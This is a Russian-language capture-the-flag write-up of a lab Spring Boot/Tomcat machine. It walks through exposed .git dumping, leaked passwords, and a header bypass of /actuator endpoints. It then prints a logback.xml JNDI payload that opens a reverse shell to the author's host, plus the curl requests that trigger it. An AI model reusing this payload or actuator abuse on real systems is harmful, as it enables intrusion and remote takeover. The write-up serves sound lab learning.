<img width="1901" height="1133" alt="{7E8FAA04-7DAF-49C0-8BC5-FE03B2E667A8}" src="https://github.com/user-attachments/assets/aeb1fd39-f620-4707-9a90-8cdcbb9e6fa9" />

На главной странице красуется Hello, World!

<img width="1603" height="1012" alt="{45B73007-2889-4808-83CF-0AD97A92818D}" src="https://github.com/user-attachments/assets/b4739447-429e-4224-90c6-8a9fa2e262ab" />

вывод nmap = 

```
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

смотрим заголовок http

<img width="1557" height="521" alt="{77C42D8D-4534-4428-AD11-2F9501F211C1}" src="https://github.com/user-attachments/assets/a8958f8e-736c-4a6f-919e-8e0cd8b7d368" />


```
Cookie: JSESSIONID=B4F3ECD1924843018AC9E2E08E169032
```
jsessionid встречается в Java-архитектурах, так же по скрину 404 ошибки (который будет ниже), мы видим что это tomcat, по названию румы мы можем предположить что это Spring Framework, я думал что он уязвим к Spring4Shell (CVE-2022-22965), но я был не прав
<img width="1601" height="968" alt="{2215A214-27D5-4B17-8686-5B49EA8FBEEE}" src="https://github.com/user-attachments/assets/20361343-d8c4-441e-9da0-947b577d48bd" />


через фаззинг мы видим 
```
.git                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
.git/logs/refs          [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
.git/logs/HEAD          [Status: 200, Size: 319, Words: 18, Lines: 3, Duration: 144ms]
.git/index              [Status: 200, Size: 1484, Words: 21, Lines: 22, Duration: 156ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 162ms]
.git/config             [Status: 200, Size: 148, Words: 14, Lines: 9, Duration: 176ms]
.gitignore              [Status: 200, Size: 355, Words: 11, Lines: 37, Duration: 183ms]
:: Progress: [5366/5366] :: Job [1/1] :: 566 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

<img width="1910" height="295" alt="{0FE2425B-9364-4B4B-95D6-559F57DFCA09}" src="https://github.com/user-attachments/assets/884d6d27-dc99-463c-8270-4dc8a43f8e3a" />
через git-dumper мы задампили гиты и узнали креды
johnsmith:PrettyS3cureSpringPassword123.

там же есть кастомный заголовок X-9ad42dea0356cb04: 172.16.0.1 который относиться к /actuator/env

там нашли пароль от Keystore - PrettyS3cureKeystorePassword123.

#RCE
с помощью X-9ad42dea0356cb04: 172.16.0.1 мы смоги обойти ограничения и зайти /actuator/env 
приложение разрешала POST запросы на /actuator/env и /actuator/restart, мы отправили запрос на изменение logging.config, указав на свой сервер в logback.xml



мы использовали java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.140.240 что бы поднять свой ldap и подняли свой python3 -m http.server 8000 сервер на 8000 порту для того чтобы переслать logback.xml

```
содержимое logback.xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://192.168.140.240:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE0MC4yNDAvNDQ0NCAwPiYx" as="appName" />
</configuration>
```

после этого мы отрпавили запрос триггер на сайт 

```
1 мы обновляем конфиг
curl -k -X POST "https://spring.thm/actuator/env" \
  -H "X-9ad42dea0356cb04: 172.16.0.1" \
  -H "Content-Type: application/json" \
  -d '{"name":"logging.config","value":"http://192.168.140.240:8000/logback.xml"}'

2 рестарт
curl -k -X POST "https://spring.thm/actuator/restart" -H "X-9ad42dea0356cb04: 172.16.0.1"

```
и таким образом мы получаем rce 
<img width="1277" height="598" alt="{0C25AD71-5768-4BA6-B0BC-9E786F3FCFA6}" src="https://github.com/user-attachments/assets/313225ea-27ed-4b9e-8e09-2290c2c4543c" />



# first flag :)
<img width="556" height="116" alt="{1FB686FD-A673-4AD7-AFD6-71F58421654F}" src="https://github.com/user-attachments/assets/98766704-3e19-491a-acde-d0ad4406bfb5" />


# user flag 

я предполагаю что везде где есть какой либо пароль от johnsmith, то он начинаеться с PrettyS3cureXXXPassword123. так что попытался просто подставить Account и это сработало


```
nobody@spring:/home/johnsmith$ su - johnsmith
su - johnsmith
Password: PrettyS3cureAccountPassword123.

johnsmith@spring:~$ 
```

# root flag

linpeas.sh показал что есть уязимость  CVE-2021-3493 и pwnkit, чаще всего pwnkit всегда показывает на их машинах, я не буду тратить время на pwnkit, но вот на  CVE-2021-3493 я потрачу время и проверю есть ли он или нет, а потом уже если что перейду к pwnkit

<img width="996" height="262" alt="{BE2E7410-0CB4-4C4A-9900-7F56DE90532A}" src="https://github.com/user-attachments/assets/422f4353-868f-497a-9bb6-ae2813a48f7f" />






